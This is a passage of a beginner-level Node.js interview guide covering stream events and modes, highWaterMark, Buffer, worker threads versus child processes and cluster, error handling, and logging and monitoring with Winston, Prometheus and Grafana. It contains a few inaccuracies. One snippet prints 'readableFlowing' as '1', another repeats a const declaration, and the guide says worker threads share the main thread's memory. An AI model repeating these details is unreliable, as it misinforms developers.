stream.on('finish', () => {
  console.log('All data written!');
});
```

3. **'pipe' event** - Emitted when pipe() is called
```javascript
readStream.on('pipe', (source) => {
  console.log('pipe() called on stream');
});
```

4. **'unpipe' event** - Emitted when unpipe() is called
```javascript
readStream.on('unpipe', (source) => {
  console.log('unpipe() called on stream');
});
```

5. **'error' event** - Emitted when error occurs
```javascript
stream.on('error', (err) => {
  console.log('Error:', err);
});
```

#### Transform Stream Events:

Transform streams emit **both readable and writable events**:
```javascript
const zlib = require('zlib');

const gzip = zlib.createGzip();

gzip.on('data', () => console.log('Transform: data ready'));
gzip.on('end', () => console.log('Transform: all transformed'));
gzip.on('drain', () => console.log('Transform: buffer drained'));
```

### Complete Event Sequence Example:

```javascript
const fs = require('fs');

const readable = fs.createReadStream('file.txt');
const writable = fs.createWriteStream('output.txt');

// Readable stream events
readable.on('data', (chunk) => {
  console.log('1. data event:', chunk.length, 'bytes');
});

readable.on('pause', () => {
  console.log('2. pause event');
});

readable.on('resume', () => {
  console.log('3. resume event');
});

readable.on('end', () => {
  console.log('4. end event');
});

// Writable stream events
writable.on('drain', () => {
  console.log('5. drain event');
});

writable.on('finish', () => {
  console.log('6. finish event');
});

readable.pipe(writable);

// Output sequence:
// 1. data event: 65536 bytes
// 1. data event: 65536 bytes
// 2. pause event (back pressure)
// 5. drain event (writable drained)
// 3. resume event (readable resumed)
// 4. end event (all data read)
// 6. finish event (all data written)
```

### Events in Different Stream Types:

**File Stream Events:**
```javascript
const readable = fs.createReadStream('large-file.txt');

readable.on('open', (fd) => console.log('File opened'));
readable.on('close', () => console.log('File closed'));
readable.on('data', (chunk) => console.log('Data received'));
readable.on('end', () => console.log('EOF reached'));
readable.on('error', (err) => console.log('Error:', err));
```

**HTTP Stream Events:**
```javascript
const http = require('http');

http.createServer((req, res) => {
  req.on('data', (chunk) => console.log('POST data:', chunk));
  req.on('end', () => console.log('Request body received'));
  
  res.on('finish', () => console.log('Response sent'));
}).listen(3000);
```

### Event Handling Best Practice:

```javascript
const { pipeline } = require('stream');
const fs = require('fs');

pipeline(
  fs.createReadStream('input.txt'),
  fs.createWriteStream('output.txt'),
  (err) => {
    if (err) {
      console.log('Pipeline error:', err);
      // All streams already destroyed!
    } else {
      console.log('Pipeline completed successfully!');
    }
  }
);

// Alternatively with event handlers:
const readable = fs.createReadStream('input.txt');
const writable = fs.createWriteStream('output.txt');

readable
  .on('error', (err) => console.log('Read error:', err))
  .on('data', (chunk) => console.log('Chunk size:', chunk.length))
  .on('end', () => console.log('Reading complete'))
  .pipe(writable)
  .on('error', (err) => console.log('Write error:', err))
  .on('finish', () => console.log('Writing complete'));
```

### Summary of Key Events:

| Event | When | What to do |
|-------|------|-----------|
| **data** | Data available | Process the chunk |
| **end** | No more data | Cleanup |
| **error** | Error occurs | Handle error |
| **drain** | Buffer empty | Resume writing |
| **finish** | Write complete | All done |
| **pause** | Stream paused | Resume later |
| **resume** | Stream resumed | Continue |

---

## 19. What is flowing mode and pause mode in streams?

### Two Modes of Readable Streams:

Every readable stream can operate in two modes:

1. **Flowing Mode** - Data flows automatically
2. **Paused Mode** - Data waits to be pulled

### Flowing Mode:

**In flowing mode, data is pushed automatically** from the stream.

```javascript
const fs = require('fs');

const stream = fs.createReadStream('file.txt');

// Entering flowing mode (1)
stream.on('data', (chunk) => {
  console.log('Received chunk automatically:', chunk);
});

// Data flows automatically without asking!
```

**How to enter flowing mode:**
- Attach a `'data'` event listener
- Call `stream.resume()`
- Call `stream.pipe()`

### Paused Mode:

**In paused mode, data waits for you to pull it.**

```javascript
const fs = require('fs');

const stream = fs.createReadStream('file.txt');

// Stays in paused mode by default
// Must manually read data

stream.on('readable', () => {
  let chunk;
  while ((chunk = stream.read()) !== null) {
    console.log('Manually pulled chunk:', chunk);
  }
});
```

**How to enter paused mode:**
- Don't attach `'data'` listener (default)
- Call `stream.pause()`

### Switching Modes:

```javascript
const fs = require('fs');
const stream = fs.createReadStream('file.txt');

// Start in paused mode
console.log('Initial mode: paused');

// Switch to flowing mode
stream.on('data', (chunk) => {
  console.log('Flowing mode: automatic push');
});

// Switch back to paused mode
stream.pause();
console.log('Now in paused mode');

// Back to flowing mode
stream.resume();
console.log('Back to flowing mode');
```

### Comparison:

| Aspect | Flowing Mode | Paused Mode |
|--------|-------------|-----------|
| **Data delivery** | Automatic push | Manual pull |
| **Data arrival** | Whenever available | On demand |
| **Control** | Less control | More control |
| **Use case** | Piping, auto-processing | Selective reading |
| **Speed** | Faster | Slower |

### Flowing Mode Example:

```javascript
const fs = require('fs');

// Flowing mode - data comes automatically
fs.createReadStream('file.txt')
  .on('data', (chunk) => {
    console.log('Got chunk:', chunk.length, 'bytes');
    // Process automatically
  })
  .on('end', () => {
    console.log('Done!');
  });

// Output:
// Got chunk: 65536 bytes
// Got chunk: 65536 bytes
// Got chunk: 12345 bytes
// Done!
```

### Paused Mode Example:

```javascript
const fs = require('fs');

const stream = fs.createReadStream('file.txt');

// Paused mode - you pull data when ready
stream.on('readable', () => {
  let chunk;
  
  // Manually read chunks
  while ((chunk = stream.read(16384)) !== null) {
    console.log('Manually read chunk:', chunk.length, 'bytes');
  }
});

stream.on('end', () => {
  console.log('All data read');
});

// Output:
// Manually read chunk: 16384 bytes
// Manually read chunk: 16384 bytes
// Manually read chunk: 16384 bytes
// All data read
```

### Practical Example: Processing with Control:

```javascript
const fs = require('fs');

const stream = fs.createReadStream('file.txt');
let processing = false;

stream.on('readable', () => {
  if (processing) return; // Skip if already processing
  
  let chunk;
  while ((chunk = stream.read(16384)) !== null) {
    processing = true;
    
    // Simulate heavy processing
    processData(chunk, () => {
      processing = false;
      // Try to read next chunk
      stream.emit('readable');
    });
  }
});

function processData(chunk, callback) {
  setTimeout(() => {
    console.log('Processed chunk');
    callback();
  }, 1000); // Simulate 1 second processing
}
```

### When to Use Each Mode:

**Use Flowing Mode when:**
- Streaming large files efficiently
- Using `pipe()`
- You want automatic data processing
- Back pressure is handled by `pipe()`

**Use Paused Mode when:**
- You need fine-grained control
- Processing takes time
- You want to limit data consumption
- You need to batch chunks

### Important Note: Switching Behavior:

```javascript
const stream = fs.createReadStream('file.txt');

// In paused mode initially
console.log(stream.readableFlowing); // null

// Add data listener - switches to flowing
stream.on('data', () => {});
console.log(stream.readableFlowing); // 1 (flowing)

// Pause it
stream.pause();
console.log(stream.readableFlowing); // false (paused)

// Resume it
stream.resume();
console.log(stream.readableFlowing); // 1 (flowing)
```

### Best Practice:

```javascript
// ✅ Use pipe() which handles modes automatically
fs.createReadStream('input.txt')
  .pipe(fs.createWriteStream('output.txt'));

// ✅ Or use flowing mode for simple processing
fs.createReadStream('file.txt')
  .on('data', (chunk) => process(chunk));

// ✅ Use paused mode when you need control
const stream = fs.createReadStream('file.txt');
stream.on('readable', () => {
  let chunk = stream.read();
  // Process with control
});
```

---

## 20. What is highWaterMark?

### What is highWaterMark?

**highWaterMark** is a **threshold value** that determines:
- When to **stop reading** from source (back pressure point)
- How much data to **buffer** before pausing

Think of it as a **water tank level indicator** 🌊:
- When water level reaches the mark, stop filling
- Wait for water to drain below the mark
- Then resume filling

### Default Values:

```javascript
// Readable stream default
const readable = fs.createReadStream('file.txt');
// highWaterMark: 64 KB

// Writable stream default
const writable = fs.createWriteStream('file.txt');
// highWaterMark: 16 KB
```

### How It Works:

1. **Data accumulates in buffer** until it reaches `highWaterMark`
2. **Back pressure triggered** → Reading pauses
3. **Writable consumes data** → Buffer drains
4. **Buffer below threshold** → Reading resumes

### Example with highWaterMark:

```javascript
const fs = require('fs');

const readable = fs.createReadStream('large-file.txt', {
  highWaterMark: 32 * 1024 // 32 KB
});

readable.on('data', (chunk) => {
  console.log('Chunk size:', chunk.length);
  console.log('Buffer state:', readable.readableLength); // Amount in buffer
});

// With highWaterMark of 32KB:
// - Reads 32KB chunks
// - If buffer exceeds 32KB, pauses reading
// - Resumes when buffer drains
```

### Setting Custom highWaterMark:

```javascript
const fs = require('fs');

// Small buffer (for slow processing)
const readable = fs.createReadStream('file.txt', {
  highWaterMark: 8 * 1024 // 8 KB
});

// Large buffer (for fast processing)
const readable = fs.createReadStream('file.txt', {
  highWaterMark: 256 * 1024 // 256 KB
});
```

### Practical Example: Back Pressure with highWaterMark:

```javascript
const fs = require('fs');

const readable = fs.createReadStream('large-file.txt', {
  highWaterMark: 16 * 1024 // 16 KB
});

const writable = fs.createWriteStream('output.txt', {
  highWaterMark: 4 * 1024 // 4 KB buffer
});

let totalChunks = 0;
let pausedCount = 0;

readable.on('data', (chunk) => {
  totalChunks++;
  
  // Check if back pressure exists
  const canContinue = writable.write(chunk);
  
  if (!canContinue) {
    pausedCount++;
    console.log(`⚠️ Pause #${pausedCount} - Buffer full (${writable.writableLength} bytes buffered)`);
    readable.pause();
  }
});

writable.on('drain', () => {
  console.log(`✅ Resumed - Buffer drained (${writable.writableLength} bytes buffered)`);
  readable.resume();
});

readable.on('end', () => {
  console.log(`\n✅ Complete!`);
  console.log(`Total chunks: ${totalChunks}`);
  console.log(`Times paused: ${pausedCount}`);
});
```

### Using pipe() with highWaterMark:

```javascript
const fs = require('fs');
const zlib = require('zlib');

// Configure highWaterMark for streams
fs.createReadStream('large-file.txt', {
  highWaterMark: 64 * 1024 // 64 KB chunks
})
.pipe(
  zlib.createGzip({ chunkSize: 32 * 1024 })
)
.pipe(
  fs.createWriteStream('large-file.txt.gz', {
    highWaterMark: 32 * 1024 // 32 KB buffer
  })
);

// pipe() handles back pressure automatically at each stage!
```

### Choosing the Right highWaterMark:

| Scenario | Recommended | Reason |
|----------|-------------|--------|
| Small files | 16-32 KB | Less memory usage |
| Large files | 64-256 KB | Faster processing |
| Slow network | 8-16 KB | Handle congestion |
| Fast SSD | 256+ KB | Maximize throughput |
| Limited RAM | 8-32 KB | Reduce memory |

### Memory Impact Example:

```javascript
const fs = require('fs');

// With small highWaterMark
const small = fs.createReadStream('file.txt', {
  highWaterMark: 8 * 1024 // 8 KB at a time
});
// Lower memory usage, more frequent reads

// With large highWaterMark
const large = fs.createReadStream('file.txt', {
  highWaterMark: 512 * 1024 // 512 KB at a time
});
// Higher memory usage, faster processing
```

### Monitoring Buffer:

```javascript
const fs = require('fs');

const stream = fs.createReadStream('file.txt', {
  highWaterMark: 32 * 1024
});

stream.on('data', (chunk) => {
  console.log('Chunk size:', chunk.length);
  console.log('Buffered:', stream.readableLength, 'bytes');
  console.log('High water mark:', stream.readableHighWaterMark, 'bytes');
  console.log('---');
});
```

### Key Takeaways:

1. **highWaterMark controls buffering** - Sets the threshold for back pressure
2. **Default readable: 64 KB** - Readable streams
3. **Default writable: 16 KB** - Writable streams
4. **Lower = less memory** but slower
5. **Higher = faster** but uses more memory
6. **Use pipe()** - Automatically handles highWaterMark optimization

### Best Practice:

```javascript
// ✅ Use pipe() - handles everything optimally
fs.createReadStream('input.txt')
  .pipe(fs.createWriteStream('output.txt'));

// ✅ Or manually handle with correct highWaterMark
const readable = fs.createReadStream('input.txt', {
  highWaterMark: 64 * 1024
});

const writable = fs.createWriteStream('output.txt', {
  highWaterMark: 32 * 1024
});

readable.pipe(writable);
```

---





# Node.js Deep Dive: Questions 21–30
### Explained in Plain English — No Prior Knowledge Needed

---

## Q21. What is Buffer and why is it needed?

### The Simple Story

Imagine you're reading a book, but the book is written in a language that uses symbols you've never seen — not English letters, not numbers, just raw symbols. To "read" this book, you first need to store those symbols somewhere before you can make sense of them. That temporary storage place is called a **Buffer**.

In Node.js, a **Buffer** is a fixed-size chunk of memory used to store **raw binary data** — which is basically data in 0s and 1s, before it gets converted into something human-readable like text.

### Why is it needed?

JavaScript was originally designed for browsers — dealing with text, numbers, and DOM elements. It was **never designed** to handle raw binary data like:

- Files (images, videos, PDFs)
- Network packets
- Database streams
- Encrypted data

When Node.js came along and needed to work with all of the above, regular JavaScript had no way to handle raw binary. So **Buffer was introduced** as a way to work with binary data directly in memory.

### Real-world analogy

Think of Buffer like a **loading dock** at a warehouse. Goods (data) arrive and need to be temporarily held before they are processed and moved to their final destination. The loading dock doesn't care what the goods are — it just holds them until someone is ready.

### Simple Code Example

```js
// Creating a Buffer from a string
const buf = Buffer.from('Hello');
console.log(buf); // <Buffer 48 65 6c 6c 6f>
// Each number is the ASCII code of each letter

// Converting back to string
console.log(buf.toString()); // Hello
```

### Key Points to Remember

- Buffer stores data **outside** the V8 JavaScript engine's memory heap
- Buffers are **fixed-size** — you decide their size when you create them
- They are mainly used when dealing with **files, streams, and network communication**
- Buffer is available **globally** in Node.js — no need to import it

---

## Q22. How does Buffer work with Streams?

### First, what is a Stream?

Imagine you're watching a YouTube video. You don't wait for the entire video to download before watching — it starts playing almost immediately, loading bit by bit. That's a **stream** — data flowing continuously, piece by piece, instead of all at once.

A **Stream in Node.js** is an abstract interface for working with **flowing data**. Instead of reading a whole file at once (which could be 5GB and crash your memory), you read it in small **chunks**.

### Where does Buffer come in?

When data flows through a stream, it doesn't arrive as neat, complete pieces. It arrives as raw binary chunks. **Buffer is the container that holds each of those chunks** while they're being processed.

Think of it like a **pipe with water flowing through it**:
- The pipe = the Stream
- The water at any given moment = the Buffer (a chunk of data)

### Visual Flow

```
File on Disk
     |
     v
[Stream opens the file]
     |
     v
[Chunk 1 arrives → stored in Buffer → processed]
[Chunk 2 arrives → stored in Buffer → processed]
[Chunk 3 arrives → stored in Buffer → processed]
     |
     v
Done! (without loading the whole file into memory)
```

### Code Example

```js
const fs = require('fs');

const readStream = fs.createReadStream('bigfile.txt');

readStream.on('data', (chunk) => {
  // chunk is a Buffer!
  console.log('Received chunk of size:', chunk.length);
  console.log(chunk.toString()); // convert Buffer to readable text
});

readStream.on('end', () => {
  console.log('File reading complete');
});
```

### Types of Streams

| Stream Type | Description | Example |
|---|---|---|
| Readable | You read data from it | `fs.createReadStream` |
| Writable | You write data to it | `fs.createWriteStream` |
| Duplex | Both read and write | Network sockets |
| Transform | Read, modify, write | Compression (zlib) |

### Why use Streams + Buffer instead of just reading all at once?

- Reading a 10GB log file all at once = **crashes or eats all RAM**
- Reading in chunks using streams = **memory stays low**, processing is continuous
- Buffer makes each chunk **handleable** in memory

---

## Q23. What is Worker Thread in Node.js?

### The Problem First

Node.js runs on a **single thread**. Think of it like a single cashier at a billing counter. They can handle one customer at a time but switch between tasks very quickly — that's how Node handles multiple requests efficiently.

But what happens when one task is extremely heavy? Like:
- Compressing a huge video
- Running complex math calculations
- Generating a PDF with thousands of records

This **blocks the single cashier** — no other customers get served until this heavy task is done. Your entire server freezes for everyone.

### Worker Threads to the Rescue

**Worker Threads** let you hire **extra workers** (threads) to handle heavy tasks in the background, while the main thread (your cashier) keeps serving other customers normally.

### Simple Analogy

> Imagine a restaurant. The main waiter takes orders and serves food. But when a complex dish needs to be made, a separate chef (Worker Thread) handles it in the kitchen, without blocking the main waiter from serving other tables.

### How to use it

```js
// main.js
const { Worker } = require('worker_threads');

const worker = new Worker('./heavyTask.js'); // spawn a new worker

worker.on('message', (result) => {
  console.log('Result from worker:', result);
});

// heavyTask.js
const { parentPort } = require('worker_threads');

// Simulate heavy computation
let sum = 0;
for (let i = 0; i < 1_000_000_000; i++) {
  sum += i;
}

parentPort.postMessage(sum); // send result back to main
```

### Key Points

- Worker Threads share the **same memory** as the main thread (unlike child processes)
- They are great for **CPU-intensive** tasks (calculations, image processing)
- They do **not** help with I/O tasks (reading files, DB calls) — async already handles those well
- Communication happens via `postMessage()` and `on('message', ...)`

---

## Q24. Difference between Worker Thread and Child Process

### The Simple Comparison

Both Worker Threads and Child Processes let you run code **in parallel**, but they work very differently.

### Analogy

- **Worker Thread**: Hiring a colleague in the same office. They share the same building (memory), same tools, can talk instantly.
- **Child Process**: Opening a completely new office in another building. They have their own memory, their own tools, and communicate by sending messages via email (IPC).

### Side-by-Side Comparison

| Feature | Worker Thread | Child Process |
|---|---|---|
| Memory | **Shared** with parent | **Separate** from parent |
| Speed to create | Fast (lightweight) | Slow (heavy, new process) |
| Communication | Via `postMessage` (fast) | Via IPC / stdin-stdout (slower) |
| Crash isolation | If it crashes, can affect parent | Crash stays isolated |
| Best for | CPU-heavy tasks (math, compression) | Running separate scripts, shell commands |
| Module | `worker_threads` | `child_process` |

### When to use which?

**Use Worker Thread when:**
- You need fast data sharing between threads
- Task is CPU-intensive (number crunching, image processing)
- You want low memory overhead

**Use Child Process when:**
- You need to run a completely separate script or program
- You want total crash isolation
- You're running shell commands or CLI tools

### Quick Code Contrast

```js
// Child Process — runs a separate script
const { fork } = require('child_process');
const child = fork('script.js');
child.send({ data: 'hello' });

// Worker Thread — runs code in a new thread
const { Worker } = require('worker_threads');
const worker = new Worker('./task.js');
worker.postMessage({ data: 'hello' });
```

---

## Q25. Difference between Cluster and Worker Thread

### What is Cluster?

Before understanding the difference, let's understand **Cluster**.

Node.js runs on **one CPU core** by default. If your machine has 8 cores, 7 are sitting idle. The **Cluster module** lets you create **multiple instances of your Node.js app** — one per CPU core — all sharing the same port.

### Analogy

- **Cluster**: Opening 8 identical restaurants (one per street). Each restaurant is fully independent and serves its own customers.
- **Worker Thread**: One restaurant with 8 chefs in the same kitchen, working on different dishes simultaneously.

### Side-by-Side Comparison

| Feature | Cluster | Worker Thread |
|---|---|---|
| What it creates | Multiple **processes** | Multiple **threads** in one process |
| Memory | Each process has **its own memory** | Threads **share memory** |
| Use case | Handling **more web requests** | Handling **heavy computation** |
| Scaling | Scales **across CPU cores** | Scales a single task |
| Communication | Via IPC (message passing) | Via `postMessage` (faster) |
| Best for | HTTP servers, APIs | Image processing, data crunching |

### When to use which?

**Use Cluster when:**
- You want to handle more concurrent HTTP requests
- You want to use all CPU cores for your web server
- Example: Your Express app under high traffic

**Use Worker Threads when:**
- A single request triggers heavy computation
- You want to offload CPU work without creating new server processes
- Example: Generating a report inside one API call

### Cluster Code Snapshot

```js
const cluster = require('cluster');
const os = require('os');
const http = require('http');

if (cluster.isPrimary) {
  const numCPUs = os.cpus().length;
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork(); // create a worker for each CPU core
  }
} else {
  http.createServer((req, res) => {
    res.end('Hello from worker ' + process.pid);
  }).listen(3000);
}
```

---

## Q26. How to handle errors in Node.js applications in detail?

### Why Error Handling Matters

Imagine your app is running in production and a database query fails. Without error handling, the entire Node.js process crashes, and **all users lose service**. Proper error handling means: the app acknowledges the failure, logs it, and continues running.

### Types of Errors in Node.js

1. **Operational Errors** — Expected, recoverable: file not found, network timeout, DB connection failure
2. **Programmer Errors** — Bugs in code: `undefined is not a function`, wrong logic, type errors

### The Full Error Handling Toolkit

---

#### 1. try-catch (for synchronous + async/await code)

```js
// Synchronous
try {
  const data = JSON.parse(invalidJson);
} catch (err) {
  console.error('Parsing failed:', err.message);
}

// Async/Await
async function fetchUser(id) {
  try {
    const user = await db.findUser(id);
    return user;
  } catch (err) {
    console.error('DB error:', err.message);
    throw err; // re-throw if needed
  }
}
```

---

#### 2. Error-first callbacks (old Node.js pattern)

```js
fs.readFile('file.txt', (err, data) => {
  if (err) {
    console.error('File read error:', err.message);
    return;
  }
  console.log(data.toString());
});
```

---

#### 3. Promise `.catch()`

```js
fetchData()
  .then(data => process(data))
  .catch(err => console.error('Error:', err));
```

---

#### 4. Express Global Error Middleware

In Express.js, you can define a **central error handler** — a special function with 4 parameters that catches all errors.

```js
// All routes above this line...

app.use((err, req, res, next) => {
  console.error('Unhandled error:', err.message);
  res.status(500).json({ error: 'Something went wrong!' });
});
```

---

#### 5. `process.on('uncaughtException')` — Last Resort

Catches errors that **escaped** all handlers. You should **log and restart** the app here, not continue.

```js
process.on('uncaughtException', (err) => {
  console.error('FATAL: Uncaught Exception:', err);
  process.exit(1); // always exit after this
});
```

---

#### 6. `process.on('unhandledRejection')` — For missed Promise errors

```js
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Promise Rejection at:', promise, 'reason:', reason);
  process.exit(1);
});
```

---

### Best Practices Summary

- Always use `try-catch` with `async/await`
- Never swallow errors silently (empty catch blocks are dangerous)
- Always log errors with enough context (what happened, where, why)
- Use centralized error middleware in Express
- Use `process.on('uncaughtException')` as safety net, always exit after it
- Use a proper logger (like Winston) instead of `console.error`

---

## Q27. How to do Logging in Node.js with Winston, Grafana, and Prometheus? (Interview Story)

### The Story

> "Let me walk you through how I set up logging and monitoring in a Node.js production application..."

---

### Chapter 1: Why console.log is not enough

When your app runs in production:
- `console.log` has no **log levels** (you can't distinguish info vs error)
- It has no **timestamps**
- It can't write to files or external services
- It's hard to search through thousands of lines

You need a **proper logging library** — and that's where **Winston** comes in.

---

### Chapter 2: Winston — The Logger

**Winston** is the most popular logging library in Node.js. Think of it as a smarter, more powerful `console.log`.

**Key concepts:**
- **Log Levels**: `error > warn > info > http > verbose > debug > silly`
- **Transports**: Where logs go (console, file, database, cloud service)
- **Formats**: How logs look (JSON, plain text, colorized)

```js
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.Console(),             // log to terminal
    new winston.transports.File({ filename: 'app.log' }) // log to file
  ]
});

// Usage
logger.info('Server started on port 3000');
logger.error('Database connection failed', { error: err.message });
logger.warn('High memory usage detected');
```

**Output looks like:**
```json
{ "level": "info", "message": "Server started on port 3000", "timestamp": "2024-03-15T10:00:00.000Z" }
```

---

### Chapter 3: Prometheus — The Metrics Collector

While Winston handles **logs** (what happened), **Prometheus** handles **metrics** (how the system is performing).

Think of Prometheus like a **health monitoring device** for your app. It constantly collects numbers like:
- How many requests per second?
- How long do requests take?
- How much memory is being used?
- How many errors occurred?

```js
const promClient = require('prom-client');

// Collect default Node.js metrics automatically
promClient.collectDefaultMetrics();

// Create a custom metric — count total API requests
const httpRequestCounter = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total number of HTTP requests',
  labelNames: ['method', 'route', 'status']
});

// In your Express middleware
app.use((req, res, next) => {
  res.on('finish', () => {
    httpRequestCounter.inc({
      method: req.method,
      route: req.path,
      status: res.statusCode
    });
  });
  next();
});

// Expose metrics endpoint for Prometheus to scrape
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', promClient.register.contentType);
  res.end(await promClient.register.metrics());
});
```

Prometheus **scrapes** (pulls data from) your `/metrics` endpoint every few seconds and stores it in its time-series database.

---

### Chapter 4: Grafana — The Dashboard

**Grafana** is the **visual layer** on top of Prometheus. It takes the raw numbers Prometheus collected and turns them into beautiful, real-time dashboards with graphs, charts, and alerts.

> Prometheus = the data collector
> Grafana = the visual dashboard

In Grafana, you write **PromQL** (Prometheus Query Language) queries to visualize data:
- `rate(http_requests_total[5m])` → requests per second over 5 minutes
- `process_heap_used_bytes` → current memory usage
- `http_request_duration_seconds_bucket` → request latency histogram

---

### The Full Flow (Interview Diagram)

```
Your Node.js App
      |
      |-- Winston --> Log files / Console / External log aggregators
      |
      |-- /metrics endpoint
            |
            v
        Prometheus (scrapes every 15s, stores time-series data)
            |
            v
          Grafana (connects to Prometheus, visualizes dashboards + alerts)
```

---

### Interview Wrap-up Line

> "So in summary: **Winston** gives us structured, leveled logs for debugging. **Prometheus** gives us numeric metrics about app health. **Grafana** visualizes those metrics so the team can monitor the app in real-time and get alerted before things break."

---

## Q28. How to do Profiling/Monitoring in a Node.js application? And on what metrics?

### What is Profiling vs Monitoring?

- **Monitoring**: Continuously watching your app to see if it's healthy — like a nurse checking your vitals every hour.
- **Profiling**: Deeply analyzing your app at a specific moment to find **what's slow or consuming too much** — like a doctor doing a full check-up.

---

### Monitoring: Key Metrics to Watch

#### 1. CPU Usage
- Is the Node.js process consuming too much CPU?
- High CPU = possibly a CPU-blocking loop or heavy computation on main thread
- Tool: `process.cpuUsage()`, Prometheus `process_cpu_seconds_total`

#### 2. Memory Usage
- **Heap Used**: How much of V8's heap is in use
- **Heap Total**: Total heap allocated
- **External**: Memory used by Buffers (outside V8)
- Tool: `process.memoryUsage()`, Prometheus `process_heap_used_bytes`

```js
const mem = process.memoryUsage();
console.log('Heap used:', mem.heapUsed / 1024 / 1024, 'MB');
```

#### 3. Event Loop Lag
- Node.js is single-threaded. If the event loop is **lagging**, requests slow down for everyone
- High event loop lag = something is **blocking** the main thread
- Tool: `clinic.js`, `@newrelic/native-metrics`

#### 4. Request Rate & Latency
- How many requests/second is your app handling?
- How long does each request take (p50, p95, p99 percentiles)?
- Tool: Prometheus `http_request_duration_seconds`

#### 5. Error Rate
- What percentage of requests are failing?
- A sudden spike in errors = something broke in deployment
- Tool: Prometheus counter for 5xx responses

#### 6. Active Connections / Concurrent Users
- How many users are currently connected?
- Helps detect traffic spikes and plan scaling

---

### Profiling: Finding What's Slow

#### Node.js Built-in Profiler

```bash
node --prof app.js           # run app with profiling
node --prof-process isolate-*.log > processed.txt  # read the profile
```

#### Chrome DevTools (Remote Debugging)

```bash
node --inspect app.js
# Open Chrome → chrome://inspect → connect to your Node process
# CPU profiler, memory snapshot, heap timeline available
```

#### clinic.js (Best for beginners)

```bash
npm install -g clinic
clinic doctor -- node app.js    # overall health check
clinic flame -- node app.js     # flame graph (shows what code is slow)
clinic bubbleprof -- node app.js # shows async bottlenecks
```

---

### Best Practices

- Monitor all **4 golden signals**: Latency, Traffic, Errors, Saturation
- Set **alerts** in Grafana (e.g., alert if error rate > 5%)
- Profile **before** optimizing — don't guess what's slow, measure it
- Use `heapdump` to take memory snapshots and find memory leaks

---

## Q29. How to do Performance Optimisation of a Node.js Application?

### The Golden Rule

> **"Measure first, optimize second."** Never guess. Use profiling to find the actual bottleneck.

---

### 1. Avoid Blocking the Event Loop

Node.js is single-threaded. If your main thread is blocked, **everyone waits**.

**Bad:**
```js
// Synchronous file read — BLOCKS the event loop
const data = fs.readFileSync('bigfile.txt');
```

**Good:**
```js
// Asynchronous — non-blocking
const data = await fs.promises.readFile('bigfile.txt');
```

**Rule**: Never use `*Sync` methods in production servers. Never run heavy loops on the main thread.

---

### 2. Use Streams for Large Data

Instead of loading a full file or dataset into memory, stream it.

```js
// BAD — loads entire 10GB file into RAM
const data = fs.readFileSync('huge.csv');

// GOOD — streams it chunk by chunk
fs.createReadStream('huge.csv').pipe(processStream).pipe(res);
```

---

### 3. Use Caching

Don't repeatedly calculate or fetch the same data.

```js
const NodeCache = require('node-cache');
const cache = new NodeCache({ stdTTL: 60 }); // cache for 60 seconds

async function getUser(id) {
  const cached = cache.get(id);
  if (cached) return cached; // return from cache

  const user = await db.findUser(id); // only hit DB if not cached
  cache.set(id, user);
  return user;
}
```

For distributed systems, use **Redis** as a cache.

---

### 4. Database Query Optimisation

- Add **indexes** on frequently queried fields
- Use **pagination** — never fetch 10,000 records at once
- Use **projections** — only select the fields you need
- Use **connection pooling** — don't create a new DB connection per request

---

### 5. Use Worker Threads for CPU-heavy Tasks

```js
// Instead of crunching numbers on main thread, move to Worker Thread
const { Worker } = require('worker_threads');
const worker = new Worker('./compute.js');
```

---

### 6. Use Cluster to Utilise All CPU Cores

```js
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

if (cluster.isPrimary) {
  for (let i = 0; i < numCPUs; i++) cluster.fork();
}
```

---

### 7. Compress HTTP Responses

```js
const compression = require('compression');
app.use(compression()); // gzip all responses
```

This reduces response size by up to 70%.

---

### 8. Use Connection Pooling for Databases

```js
const pool = mysql.createPool({
  connectionLimit: 10, // reuse up to 10 connections
  host: 'localhost',
  database: 'mydb'
});
```

---

### 9. Avoid Memory Leaks

Common causes:
- Global variables that grow over time
- Event listeners that are never removed
- Closures holding large objects

Detect with:
```bash
clinic doctor -- node app.js
# or use Chrome DevTools heap snapshots
```

---

### 10. Use HTTP/2 and Keep-Alive

- HTTP/2 allows **multiple requests** over a single connection
- Keep-Alive reuses TCP connections instead of creating new ones per request

---

### Optimisation Checklist

| Area | Action |
|---|---|
| Event Loop | Remove all blocking sync calls |
| Data handling | Use Streams instead of in-memory reads |
| Caching | Cache DB results in Redis |
| Scaling | Use Cluster for multi-core usage |
| Heavy tasks | Move to Worker Threads |
| Responses | Enable gzip compression |
| Database | Add indexes, use connection pooling |
| Memory | Profile for leaks regularly |

---

## Q30. Tell me more about Grafana and Prometheus. How do they work together?

### The Analogy: Weather Station + Weather App

Imagine:
- **Prometheus** is a **weather station** — it constantly measures temperature, humidity, wind speed, and stores all those readings with timestamps.
- **Grafana** is the **weather app on your phone** — it connects to the weather station's data and displays beautiful charts, current readings, and sends you alerts ("Storm alert: humidity > 90%!").

You need both — one without the other is incomplete.

---

### Prometheus — Deep Dive

**Prometheus** is an open-source **time-series database and monitoring system**. It was originally built at SoundCloud and is now a CNCF (Cloud Native Computing Foundation) project.

#### How it works:

```
Your App exposes:  GET /metrics
                       ↓ (every 15 seconds, Prometheus "scrapes" this URL)
             Prometheus stores: 
             { metric_name, labels, value, timestamp }
```

#### Types of metrics in Prometheus:

| Type | Description | Example |
|---|---|---|
| **Counter** | Only goes up, never resets | Total requests served |
| **Gauge** | Can go up and down | Current memory usage |
| **Histogram** | Groups values into buckets | Request duration distribution |
| **Summary** | Pre-calculated percentiles | p95 request latency |

#### PromQL — Querying Prometheus

Prometheus has its own query language called **PromQL**.

```promql
# Total requests in last 5 minutes
rate(http_requests_total[5m])

# Memory usage in MB
process_heap_used_bytes / 1024 / 1024

# Error rate (% of 5xx responses)
rate(http_requests_total{status=~"5.."}[5m]) / rate(http_requests_total[5m]) * 100
```

#### prometheus.yml — Configuration

You tell Prometheus what to scrape in its config file:

```yaml
scrape_configs:
  - job_name: 'node-app'
    static_configs:
      - targets: ['localhost:3000']  # your app's /metrics URL
    scrape_interval: 15s
```

---

### Grafana — Deep Dive

**Grafana** is an open-source **visualization and dashboarding platform**. It doesn't store data itself — it **connects to data sources** (like Prometheus) and visualizes them.

#### Key Concepts:

